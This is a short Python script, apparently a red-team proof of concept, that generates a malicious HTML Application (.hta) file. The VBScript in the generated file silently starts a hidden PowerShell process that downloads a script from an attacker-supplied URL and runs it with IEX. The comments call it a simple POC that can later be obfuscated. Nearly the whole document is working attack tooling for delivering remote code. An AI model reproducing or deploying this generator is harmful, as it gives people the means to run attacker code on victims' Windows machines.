# /usr/bin/python3 env
# A simple HTA Generator
# This can be used to later Obfuscate
# Simple POC does not BYpass AV
print("""
  _    _ _______          _____                           _             
 | |  | |__   __|/\      / ____|                         | |            
 | |__| |  | |  /  \    | |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
 |  __  |  | | / /\ \   | | |_ |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
 | |  | |  | |/ ____ \  | |__| |  __/ | | |  __/ | | (_| | || (_) | |   
 |_|  |_|  |_/_/    \_\  \_____|\___|_| |_|\___|_|  \__,_|\__\___/|_|  

""")
html_title = input ("Choose an HTML Title >>")
app_name = input ("Choose App Name >>")
payload_n = input ("Payload Name >>")
print ("Example: http://example:80/Payload.ps1")
URL = input("Enter Full URL with PS1 payload name >>")

hta_payload = payload_n + ".hta"

hta = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n"
hta += "<html xmlns=\"http://www.w3.org/2020/xhtml\">\n"
hta += "<head>\n"
hta += "<meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" />\n"
hta += "<title>" + html_title + "</title>\n"
hta += "<script language=\"VBScript\">\n"
hta += "set oShell = CreateObject(\"Wscript.Shell\")\n"
hta += """oShell.Run("powershell.exe -WindowStyle hidden -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString"""
hta += "('"
hta += str(URL)
hta += """'));\""""
hta += "),0,true\n"
hta += "self.close\n"
hta += "</script>\n"
hta += "<hta:application\n"
hta += "id=\"oHTA\"\n"
hta +=  "applicationname=" + app_name + "\n"
hta += "application=\"yes\"\n"
hta += ">\n"
hta += "</hta:application>\n"
hta += "</head>\n"
hta += "<div>\n"
hta += "<object type=\"text/html\" data=\"One true gangsta\" width=\"100%\" height=\"100%\">\n"
hta += "</object></div>\n"
hta += "<body>\n"
hta += "</body>\n"
hta += "</html>\n"

hf = open(hta_payload, 'w')
hf.write(hta)
hf.close()

print ("File saved as: " + hta_payload)